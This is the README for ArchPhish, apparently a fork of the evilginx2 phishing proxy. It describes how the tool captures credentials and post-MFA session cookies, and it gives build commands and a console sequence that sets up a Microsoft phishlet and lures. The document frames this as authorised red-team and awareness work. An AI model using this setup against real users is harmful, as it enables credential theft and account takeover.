<p align="center">
  <img alt="ArchPhish Logo" src="https://raw.githubusercontent.com/Archsec-Emman/archphish/main/archphish.png" height="160" />
</p>

# ArchPhish

[![Go 1.22+](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go)](https://go.dev/)
[![License](https://img.shields.io/badge/License-BSD--3--Clause-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey)](https://github.com/Archsec-Emman/archphish)
[![Build](https://img.shields.io/github/actions/workflow/status/Archsec-Emman/archphish/build.yml?branch=main&label=build)](https://github.com/Archsec-Emman/archphish/actions)

**A maintained fork of [evilginx2](https://github.com/kgretzky/evilginx2) — the man-in-the-middle attack framework used for authorized phishing-simulation campaigns and red-team engagements.**

> **Credits:** All credit for the framework belongs to [Kuba Gretzky](https://github.com/kgretzky) (`evilginx2`, based on version 3.3.0). This fork exists to keep the open-source edition buildable and dependency-clean. Consider supporting the original author via the funding links in [.github/FUNDING.yml](.github/FUNDING.yml) or checking out [Evilginx Pro](https://evilginx.com/).

> **DISCLAIMER:** This tool is intended **exclusively for authorised security testing, security-awareness training, and research on systems you own or have explicit written permission to test**. Phishing real users without authorisation is illegal. The authors are not responsible for misuse.

---

## Changes in this fork

Compared to upstream `evilginx2` 3.3.0:

- **Builds again** — fixed unused imports left behind after modifications; `go build ./...` and `go vet ./...` pass on Go 1.22.
- **Evilginx Pro upsell prompt removed** from the console banner.
- **Module path updated** to `github.com/Archsec-Emman/archphish`.
- **CI** — GitHub Actions workflow building and vetting on Linux, Windows and macOS (the legacy `.travis.yml` targeting Go 1.10 was removed).

Everything else — phishlet format, session capture logic, console commands — behaves exactly like upstream. Consult the [upstream repository](https://github.com/kgretzky/evilginx2) for in-depth documentation and phishlet-writing guides.

## What it does

ArchPhish acts as a transparent reverse proxy for a target site. Visitors land on your infrastructure through lures, see the genuine site (valid TLS via Let's Encrypt or custom certificates), and log in as usual. Credentials and session cookies are captured in real time — including post-authentication session tokens — while the victim continues to the real site. Sessions can then be replayed with the captured cookies.

This is the standard technique used in authorised phishing simulations to demonstrate why MFA alone does not stop session-cookie theft, and why phishing-resistant authentication (FIDO2/WebAuthn) matters.

## Quick start

### Build from source

```bash
git clone https://github.com/Archsec-Emman/archphish.git
cd archphish
go build -o archphish .
```

### Run

```bash
sudo ./archphish                        # production: needs ports 80/443 and a domain
./archphish -p ./phishlets -t ./redirectors   # custom paths
./archphish --developer                 # developer mode (self-signed certs, local testing)
```

> Note: developer mode (`--developer`) generates self-signed certificates instead of contacting Let's Encrypt, for local testing only.

### Basic console flow

```
config domain yourdomain.tld
config ip <your-server-ip>
phishlets hostname microsoft <sub>.yourdomain.tld
phishlets enable microsoft
lures create microsoft
lures get-url 0
sessions                # watch captured sessions live
```

## Legal

Use of this software constitutes agreement to use it only for lawful, authorised purposes: your own systems, engagement scopes with written permission, or awareness training programmes. Intercepting credentials of real users without authorisation violates computer-fraud laws in most jurisdictions.

## License

BSD-3-Clause — see [LICENSE](LICENSE). Copyright (c) 2018-2023 Kuba Gretzky, portions Copyright (c) 2025 Archsec-Emman.
